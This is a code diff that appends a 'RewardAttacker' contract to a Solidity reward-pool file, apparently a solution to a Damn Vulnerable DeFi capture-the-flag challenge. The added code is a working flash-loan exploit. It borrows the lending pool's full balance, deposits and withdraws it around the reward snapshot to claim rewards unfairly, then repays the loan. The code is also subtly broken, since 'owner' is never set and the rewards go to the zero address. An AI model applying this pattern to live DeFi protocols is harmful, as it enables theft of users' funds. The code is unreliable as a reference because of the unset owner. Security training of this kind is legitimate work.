@@ -5,6 +5,7 @@ pragma solidity ^0.8.0;
 import "./RewardToken.sol";
 import "../DamnValuableToken.sol";
 import "./AccountingToken.sol";
+import "./FlashLoanerPool.sol"; 
 
 /**
  * @title TheRewarderPool
@@ -99,5 +100,45 @@ contract TheRewarderPool {
 
     function isNewRewardsRound() public view returns (bool) {
         return block.timestamp >= lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION;
+    }
+}
+
+contract RewardAttacker {
+
+    FlashLoanerPool flashLoanerPool; 
+    TheRewarderPool theRewarderPool; 
+    DamnValuableToken damnValuableToken; 
+    RewardToken rewardToken; 
+    address owner; 
+
+    constructor(address _flp, address _trp, address _dvt, address _rtk) {
+        flashLoanerPool = FlashLoanerPool(_flp); 
+        theRewarderPool = TheRewarderPool(_trp); 
+        damnValuableToken = DamnValuableToken(_dvt); 
+        rewardToken = RewardToken(_rtk); 
+    }
+
+    function receiveFlashLoan(uint _amount) external {
+        require(msg.sender == address(flashLoanerPool), "only flash pool");
+
+        //approve reward token
+        damnValuableToken.approve(address(theRewarderPool), _amount); 
+
+        //deposit borrowed amount into reward pool 
+        theRewarderPool.deposit(_amount); 
+        
+        //withdraw borrowed amount back 
+        theRewarderPool.withdraw(_amount);
+
+        //payback to flashloan pool 
+        damnValuableToken.transfer(address(flashLoanerPool), _amount); 
+
+        //tsf tokens back to owner
+        rewardToken.transfer(owner, rewardToken.balanceOf(address(this))); 
+    }
+
+    function attack() external {
+        uint balanceInFlashPool = damnValuableToken.balanceOf(address(flashLoanerPool)); 
+        flashLoanerPool.flashLoan(balanceInFlashPool); 
     }
 }
